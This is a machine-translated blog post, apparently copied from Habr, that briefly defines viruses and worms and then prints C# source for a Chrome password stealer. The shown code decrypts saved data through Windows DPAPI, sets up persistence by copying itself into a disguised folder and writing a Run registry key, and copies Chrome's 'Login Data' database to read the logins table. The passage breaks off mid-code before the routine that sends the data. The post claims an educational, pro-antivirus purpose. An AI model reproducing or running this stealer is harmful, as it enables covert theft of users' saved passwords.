<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👏🏽 🕯️ 🤜🏻 Virus de base en 20 minutes ou pourquoi utiliser un antivirus 🎃 🥘 👩🏼‍🏫</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Salutations. 
 
 De nos jours, le seuil pour entrer dans le monde de la programmation a chuté de manière significative - si auparavant, à l'aube de l'...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Virus de base en 20 minutes ou pourquoi utiliser un antivirus</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/493942/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Salutations. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De nos jours, le seuil pour entrer dans le monde de la programmation a chuté de manière significative - si auparavant, à l'aube de l'ère numérique, la programmation était quelque chose hors de l'ordinaire, "le destin des élus", aujourd'hui chaque étudiant qui sait comment google et en toute confiance peut écrire un enregistreur de frappe ou un ver manipuler un ordinateur. Sans aucune compétence particulière, vous pouvez créer des logiciels qui peuvent causer beaucoup de problèmes aux utilisateurs de PC qui, pour une raison ou une autre, négligent les programmes antivirus. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Under cat est un exemple d'écriture de tels logiciels malveillants et quelques réflexions sur les raisons pour lesquelles il est devenu si accessible.</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Donc, pour commencer, nous formalisons - qui dans le contexte de cet article est considéré sous les concepts de "virus" et de "ver". </font><font style="vertical-align: inherit;">Formellement, le concept de «virus» a été introduit pour la première fois en 1984 par Fred Cohen et il ressemblait à ceci:</font></font><br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nous définissons un «virus» informatique comme un programme qui peut «infecter» d'autres programmes en les modifiant pour inclure une copie éventuellement évoluée de lui-même</font></font></blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Plus tard, il a corrigé sa propre définition, en se concentrant sur la capacité de se propager - c'est-à-dire pour copier récursivement le code du programme. Ainsi, dans un sens plus fondamental, le virus a été défini comme un code dont l'exécution conduira à l'enregistrement d'une copie de ce code sur la bande de la machine Turing avant l'exécution, c'est-à-dire dans le futur. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette définition n'est pas entièrement correcte par rapport à la plupart des virus modernes, car les vrais virus n'ont pas besoin d'être copiés de manière récursive, et dans l'ensemble même copiés, mais ce modèle est considéré comme classique et il convient de l'utiliser pour écrire un "virus sphérique dans le vide". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En outre, en 1992, dans son </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=https://web.archive.org/web/20140203201533/" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cohen a introduit une définition formelle d'un ver informatique. </font><font style="vertical-align: inherit;">Une définition formelle complète peut être trouvée dans la source, ici je ne donnerai qu'une brève citation:</font></font><br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Récemment, le terme «ver» a été largement utilisé pour décrire les programmes qui répliquent et initialisent automatiquement l'interprétation de leurs répliques. .</font></font></blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ceux. </font><font style="vertical-align: inherit;">la raison pour laquelle le ver s'exécute peut ne pas être le ver parent, mais selon n'importe quel déclencheur, par exemple, démarrage de l'ordinateur ou minuterie. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En fait, la classification des virus est beaucoup plus large, et chaque virus se divise en plusieurs catégories à la fois, même les «chevaux de Troie» ont </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plus d'une douzaine d'espèces</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Ce n'est pas ça. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous réalisons un autre virus dans cette galaxie. </font><font style="vertical-align: inherit;">Je dirai tout de suite que cela ne fonctionnera pas sur du matériel réel protégé par un simple antivirus, mais il démontre clairement les principes qui sous-tendent la plupart des programmes antivirus. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le code complet sous le spoiler (attention, il y en a beaucoup):</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cap de spoiler</font></font></b><div class="spoiler_text"><pre><code class="java hljs">using System;<font></font>
using System.Text;<font></font>
using System.IO;<font></font>
using System.Data.SQLite;<font></font>
using System.Data;<font></font>
using System.Runtime.InteropServices;<font></font>
using System.ComponentModel;<font></font>
using System.Net.Mail;<font></font>
using System.Net;<font></font>
using Microsoft.Win32;<font></font>
using System.Threading;<font></font>
<font></font>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DPAPI</span>
</span>{<font></font>
    [DllImport(<span class="hljs-string">"crypt32.dll"</span>, SetLastError = <span class="hljs-keyword">true</span>, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> extern
    bool <span class="hljs-title">CryptProtectData</span><span class="hljs-params">(ref DATA_BLOB pPlainText, string szDescription, ref DATA_BLOB pEntropy, IntPtr pReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, <span class="hljs-keyword">int</span> dwFlags, ref DATA_BLOB pCipherText)</span></span>;<font></font>
<font></font>
    [DllImport(<span class="hljs-string">"crypt32.dll"</span>, SetLastError = <span class="hljs-keyword">true</span>, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> extern
    bool <span class="hljs-title">CryptUnprotectData</span><span class="hljs-params">(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy,
    IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, <span class="hljs-keyword">int</span> dwFlags, ref DATA_BLOB pPlainText)</span></span>;<font></font>
<font></font>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<font></font>
    internal struct DATA_BLOB<font></font>
    {<font></font>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> cbData;
        <span class="hljs-keyword">public</span> IntPtr pbData;<font></font>
    }<font></font>
<font></font>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<font></font>
    internal struct CRYPTPROTECT_PROMPTSTRUCT<font></font>
    {<font></font>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> cbSize;
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> dwPromptFlags;
        <span class="hljs-keyword">public</span> IntPtr hwndApp;
        <span class="hljs-keyword">public</span> string szPrompt;<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">private</span> IntPtr NullPtr = ((IntPtr)((<span class="hljs-keyword">int</span>)(<span class="hljs-number">0</span>)));<font></font>
<font></font>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> CRYPTPROTECT_UI_FORBIDDEN = <span class="hljs-number">0x1</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> CRYPTPROTECT_LOCAL_MACHINE = <span class="hljs-number">0x4</span>;<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitPrompt</span><span class="hljs-params">(ref CRYPTPROTECT_PROMPTSTRUCT ps)</span>
    </span>{<font></font>
        ps.cbSize = Marshal.SizeOf(<font></font>
        typeof(CRYPTPROTECT_PROMPTSTRUCT));<font></font>
        ps.dwPromptFlags = <span class="hljs-number">0</span>;<font></font>
        ps.hwndApp = NullPtr;<font></font>
        ps.szPrompt = <span class="hljs-keyword">null</span>;<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitBLOB</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] data, ref DATA_BLOB blob)</span>
    </span>{
        <span class="hljs-comment">// Use empty array for null parameter.</span>
        <span class="hljs-keyword">if</span> (data == <span class="hljs-keyword">null</span>)<font></font>
            data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];<font></font>
<font></font>
        <span class="hljs-comment">// Allocate memory for the BLOB data.</span><font></font>
        blob.pbData = Marshal.AllocHGlobal(data.Length);<font></font>
<font></font>
        <span class="hljs-comment">// Make sure that memory allocation was successful.</span>
        <span class="hljs-keyword">if</span> (blob.pbData == IntPtr.Zero)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
            <span class="hljs-string">"Unable to allocate data buffer for BLOB structure."</span>);<font></font>
<font></font>
        <span class="hljs-comment">// Specify number of bytes in the BLOB.</span><font></font>
        blob.cbData = data.Length;<font></font>
<font></font>
        <span class="hljs-comment">// Copy data from original source to the BLOB structure.</span>
        Marshal.Copy(data, <span class="hljs-number">0</span>, blob.pbData, data.Length);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> KeyType { UserKey = <span class="hljs-number">1</span>, MachineKey };<font></font>
<font></font>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> KeyType defaultKeyType = KeyType.UserKey;<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(string plainText)</span>
    </span>{
        <span class="hljs-keyword">return</span> Encrypt(defaultKeyType, plainText, String.Empty, String.Empty);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(KeyType keyType, string plainText)</span>
    </span>{
        <span class="hljs-keyword">return</span> Encrypt(keyType, plainText, String.Empty,<font></font>
        String.Empty);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(KeyType keyType, string plainText, string entropy)</span>
    </span>{
        <span class="hljs-keyword">return</span> Encrypt(keyType, plainText, entropy, String.Empty);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Encrypt</span><span class="hljs-params">(KeyType keyType, string plainText, string entropy, string description)</span>
    </span>{
        <span class="hljs-comment">// Make sure that parameters are valid.</span>
        <span class="hljs-keyword">if</span> (plainText == <span class="hljs-keyword">null</span>) plainText = String.Empty;
        <span class="hljs-keyword">if</span> (entropy == <span class="hljs-keyword">null</span>) entropy = String.Empty;<font></font>
<font></font>
        <span class="hljs-comment">// Call encryption routine and convert returned bytes into</span>
        <span class="hljs-comment">// a base64-encoded value.</span>
        <span class="hljs-keyword">return</span> Convert.ToBase64String(<font></font>
        Encrypt(keyType,<font></font>
        Encoding.UTF8.GetBytes(plainText),<font></font>
        Encoding.UTF8.GetBytes(entropy),<font></font>
        description));<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] Encrypt(KeyType keyType, <span class="hljs-keyword">byte</span>[] plainTextBytes, <span class="hljs-keyword">byte</span>[] entropyBytes, string description)<font></font>
    {<font></font>
        <span class="hljs-comment">// Make sure that parameters are valid.</span>
        <span class="hljs-keyword">if</span> (plainTextBytes == <span class="hljs-keyword">null</span>) plainTextBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span> (entropyBytes == <span class="hljs-keyword">null</span>) entropyBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span> (description == <span class="hljs-keyword">null</span>) description = String.Empty;<font></font>
<font></font>
        <span class="hljs-comment">// Create BLOBs to hold data.</span>
        DATA_BLOB plainTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB cipherTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB entropyBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
<font></font>
        <span class="hljs-comment">// We only need prompt structure because it is a required</span>
        <span class="hljs-comment">// parameter.</span><font></font>
        CRYPTPROTECT_PROMPTSTRUCT prompt =<font></font>
        <span class="hljs-keyword">new</span> CRYPTPROTECT_PROMPTSTRUCT();<font></font>
        InitPrompt(ref prompt);<font></font>
<font></font>
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            <span class="hljs-comment">// Convert plaintext bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(plainTextBytes, ref plainTextBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize plaintext BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Convert entropy bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(entropyBytes, ref entropyBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize entropy BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Disable any types of UI.</span>
            <span class="hljs-keyword">int</span> flags = CRYPTPROTECT_UI_FORBIDDEN;<font></font>
<font></font>
            <span class="hljs-comment">// When using machine-specific key, set up machine flag.</span>
            <span class="hljs-keyword">if</span> (keyType == KeyType.MachineKey)<font></font>
                flags |= CRYPTPROTECT_LOCAL_MACHINE;<font></font>
<font></font>
            <span class="hljs-comment">// Call DPAPI to encrypt data.</span><font></font>
            bool success = CryptProtectData(ref plainTextBlob,<font></font>
            description,<font></font>
            ref entropyBlob,<font></font>
            IntPtr.Zero,<font></font>
            ref prompt,<font></font>
            flags,<font></font>
            ref cipherTextBlob);<font></font>
            <span class="hljs-comment">// Check the result.</span>
            <span class="hljs-keyword">if</span> (!success)<font></font>
            {<font></font>
                <span class="hljs-comment">// If operation failed, retrieve last Win32 error.</span>
                <span class="hljs-keyword">int</span> errCode = Marshal.GetLastWin32Error();<font></font>
<font></font>
                <span class="hljs-comment">// Win32Exception will contain error message corresponding</span>
                <span class="hljs-comment">// to the Windows error code.</span>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"CryptProtectData failed."</span>, <span class="hljs-keyword">new</span> Win32Exception(errCode));<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Allocate memory to hold ciphertext.</span>
            <span class="hljs-keyword">byte</span>[] cipherTextBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[cipherTextBlob.cbData];<font></font>
<font></font>
            <span class="hljs-comment">// Copy ciphertext from the BLOB to a byte array.</span><font></font>
            Marshal.Copy(cipherTextBlob.pbData,<font></font>
            cipherTextBytes,<font></font>
            <span class="hljs-number">0</span>,<font></font>
            cipherTextBlob.cbData);<font></font>
<font></font>
            <span class="hljs-comment">// Return the result.</span>
            <span class="hljs-keyword">return</span> cipherTextBytes;<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
        {<font></font>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"DPAPI was unable to encrypt data."</span>, ex);<font></font>
        }<font></font>
        <span class="hljs-comment">// Free all memory allocated for BLOBs.</span>
        <span class="hljs-keyword">finally</span><font></font>
        {<font></font>
            <span class="hljs-keyword">if</span> (plainTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(plainTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (cipherTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(cipherTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (entropyBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(entropyBlob.pbData);<font></font>
        }<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Decrypt</span><span class="hljs-params">(string cipherText)</span>
    </span>{<font></font>
        string description;<font></font>
<font></font>
        <span class="hljs-keyword">return</span> Decrypt(cipherText, String.Empty, out description);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Decrypt</span><span class="hljs-params">(string cipherText, out string description)</span>
    </span>{
        <span class="hljs-keyword">return</span> Decrypt(cipherText, String.Empty, out description);<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Decrypt</span><span class="hljs-params">(string cipherText, string entropy, out string description)</span>
    </span>{
        <span class="hljs-comment">// Make sure that parameters are valid.</span>
        <span class="hljs-keyword">if</span> (entropy == <span class="hljs-keyword">null</span>) entropy = String.Empty;<font></font>
<font></font>
        <span class="hljs-keyword">return</span> Encoding.UTF8.GetString(<font></font>
        Decrypt(Convert.FromBase64String(cipherText),<font></font>
        Encoding.UTF8.GetBytes(entropy),<font></font>
        out description));<font></font>
    }<font></font>
<font></font>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] Decrypt(<span class="hljs-keyword">byte</span>[] cipherTextBytes, <span class="hljs-keyword">byte</span>[] entropyBytes, out string description)<font></font>
    {<font></font>
        <span class="hljs-comment">// Create BLOBs to hold data.</span>
        DATA_BLOB plainTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB cipherTextBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
        DATA_BLOB entropyBlob = <span class="hljs-keyword">new</span> DATA_BLOB();<font></font>
<font></font>
        <span class="hljs-comment">// We only need prompt structure because it is a required</span>
        <span class="hljs-comment">// parameter.</span><font></font>
        CRYPTPROTECT_PROMPTSTRUCT prompt =<font></font>
        <span class="hljs-keyword">new</span> CRYPTPROTECT_PROMPTSTRUCT();<font></font>
        InitPrompt(ref prompt);<font></font>
<font></font>
        <span class="hljs-comment">// Initialize description string.</span><font></font>
        description = String.Empty;<font></font>
<font></font>
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            <span class="hljs-comment">// Convert ciphertext bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(cipherTextBytes, ref cipherTextBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize ciphertext BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Convert entropy bytes into a BLOB structure.</span>
            <span class="hljs-keyword">try</span><font></font>
            {<font></font>
                InitBLOB(entropyBytes, ref entropyBlob);<font></font>
            }<font></font>
            <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
            {<font></font>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"Cannot initialize entropy BLOB."</span>, ex);<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Disable any types of UI. CryptUnprotectData does not</span>
            <span class="hljs-comment">// mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of</span>
            <span class="hljs-comment">// supported flags so we will not set it up.</span>
            <span class="hljs-keyword">int</span> flags = CRYPTPROTECT_UI_FORBIDDEN;<font></font>
<font></font>
            <span class="hljs-comment">// Call DPAPI to decrypt data.</span><font></font>
            bool success = CryptUnprotectData(ref cipherTextBlob,<font></font>
            ref description,<font></font>
            ref entropyBlob,<font></font>
            IntPtr.Zero,<font></font>
            ref prompt,<font></font>
            flags,<font></font>
            ref plainTextBlob);<font></font>
<font></font>
            <span class="hljs-comment">// Check the result.</span>
            <span class="hljs-keyword">if</span> (!success)<font></font>
            {<font></font>
                <span class="hljs-comment">// If operation failed, retrieve last Win32 error.</span>
                <span class="hljs-keyword">int</span> errCode = Marshal.GetLastWin32Error();<font></font>
<font></font>
                <span class="hljs-comment">// Win32Exception will contain error message corresponding</span>
                <span class="hljs-comment">// to the Windows error code.</span>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(
                <span class="hljs-string">"CryptUnprotectData failed."</span>, <span class="hljs-keyword">new</span> Win32Exception(errCode));<font></font>
            }<font></font>
<font></font>
            <span class="hljs-comment">// Allocate memory to hold plaintext.</span>
            <span class="hljs-keyword">byte</span>[] plainTextBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[plainTextBlob.cbData];<font></font>
<font></font>
            <span class="hljs-comment">// Copy ciphertext from the BLOB to a byte array.</span><font></font>
            Marshal.Copy(plainTextBlob.pbData,<font></font>
            plainTextBytes,<font></font>
            <span class="hljs-number">0</span>,<font></font>
            plainTextBlob.cbData);<font></font>
<font></font>
            <span class="hljs-comment">// Return the result.</span>
            <span class="hljs-keyword">return</span> plainTextBytes;<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span> (Exception ex)<font></font>
        {<font></font>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"DPAPI was unable to decrypt data."</span>, ex);<font></font>
        }<font></font>
        <span class="hljs-comment">// Free all memory allocated for BLOBs.</span>
        <span class="hljs-keyword">finally</span><font></font>
        {<font></font>
            <span class="hljs-keyword">if</span> (plainTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(plainTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (cipherTextBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(cipherTextBlob.pbData);<font></font>
<font></font>
            <span class="hljs-keyword">if</span> (entropyBlob.pbData != IntPtr.Zero)<font></font>
                Marshal.FreeHGlobal(entropyBlob.pbData);<font></font>
        }<font></font>
    }<font></font>
}<font></font>
<font></font>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Chrome</span>
</span>{<font></font>
<font></font>
    <span class="hljs-keyword">static</span> string filename = <span class="hljs-string">"passwords.html"</span>;
    <span class="hljs-keyword">static</span> string db_way = <span class="hljs-string">"Login Data"</span>; <span class="hljs-comment">//    </span><font></font>
<font></font>
    <span class="hljs-keyword">static</span> string wayToDir = @<span class="hljs-string">"Screens\";
    static string wayToScreen;
    static string finalDir = @"</span>C:\<span class="hljs-function">Program <span class="hljs-title">Files</span> <span class="hljs-params">(x86)</span>\Windows\ScreenSaver\"</span>;
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">(string[] args)</span>
    </span>{<font></font>
        <font></font>
        Registr();<font></font>
        Thread.Sleep(<span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);<font></font>
        Generate();<font></font>
        Send();<font></font>
     <font></font>
    }<font></font>
   <font></font>
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Registr</span><span class="hljs-params">()</span>
    </span>{<font></font>
        string way = Environment.GetCommandLineArgs()[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            <font></font>
<font></font>
            <span class="hljs-keyword">if</span> (!Directory.Exists(finalDir))<font></font>
            {<font></font>
                Directory.CreateDirectory(finalDir);<font></font>
                foreach (string iter in Directory.GetFiles(Environment.CurrentDirectory))<font></font>
                {<font></font>
                   <span class="hljs-comment">// Console.WriteLine(iter);</span>
                    string nameOfFile = iter.Split(<span class="hljs-string">'\\'</span>)[iter.Split(<span class="hljs-string">'\\'</span>).Length - <span class="hljs-number">1</span>];
                    <span class="hljs-comment">//Console.WriteLine(nameOfFile);</span>
                    File.Copy(iter, finalDir + nameOfFile, <span class="hljs-keyword">true</span>);<font></font>
                }<font></font>
                Directory.CreateDirectory(finalDir + <span class="hljs-string">"x64"</span>);<font></font>
                Directory.CreateDirectory(finalDir + <span class="hljs-string">"x86"</span>);<font></font>
                File.Copy(Environment.CurrentDirectory + <span class="hljs-string">"\\x64\\SQLite.Interop.dll"</span>, finalDir + <span class="hljs-string">"\\x64\\SQLite.Interop.dll"</span>);<font></font>
                File.Copy(Environment.CurrentDirectory + <span class="hljs-string">"\\x86\\SQLite.Interop.dll"</span>, finalDir + <span class="hljs-string">"\\x86\\SQLite.Interop.dll"</span>);<font></font>
<font></font>
<font></font>
                <span class="hljs-keyword">const</span> string name = <span class="hljs-string">"SoftWare"</span>;<font></font>
                string ExePath = finalDir + <span class="hljs-string">"soft.exe"</span>;<font></font>
                File.Copy(way, ExePath, <span class="hljs-keyword">true</span>);<font></font>
                RegistryKey reg;<font></font>
                reg = Registry.CurrentUser.CreateSubKey(<span class="hljs-string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"</span>);
                <span class="hljs-keyword">try</span><font></font>
                {<font></font>
                    reg.SetValue(name, ExePath);<font></font>
                    reg.Close();<font></font>
                }<font></font>
                <span class="hljs-keyword">catch</span><font></font>
                {   }<font></font>
            }<font></font>
<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span><font></font>
        {   }<font></font>
    }<font></font>
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Generate</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            string way_to_original = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + <span class="hljs-string">"\\Google\\Chrome\\User Data\\Default\\Login Data"</span>;<font></font>
            File.Copy(way_to_original, <span class="hljs-string">"Login Data"</span>, <span class="hljs-keyword">true</span>);<font></font>
<font></font>
            StreamWriter Writer = <span class="hljs-keyword">new</span> StreamWriter(filename, <span class="hljs-keyword">false</span>, Encoding.UTF8);<font></font>
<font></font>
            string db_field = <span class="hljs-string">"logins"</span>; <span class="hljs-comment">//  </span>
            <span class="hljs-keyword">byte</span>[] entropy = <span class="hljs-keyword">null</span>; <span class="hljs-comment">//    .</span>
                                   <span class="hljs-comment">//  DPAPI      ,</span>
                                   <span class="hljs-comment">//   -  ,  .</span>
            string description; <span class="hljs-comment">//       ,     .</span>
                                <span class="hljs-comment">//    </span>
            string ConnectionString = <span class="hljs-string">"data source="</span> + db_way + <span class="hljs-string">";New=True;UseUTF16Encoding=True"</span>;<font></font>
            DataTable DB = <span class="hljs-keyword">new</span> DataTable();<font></font>
            string sql = string.Format(<span class="hljs-string">"SELECT * FROM {0} {1} {2}"</span>, db_field, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);<font></font>
<font></font>
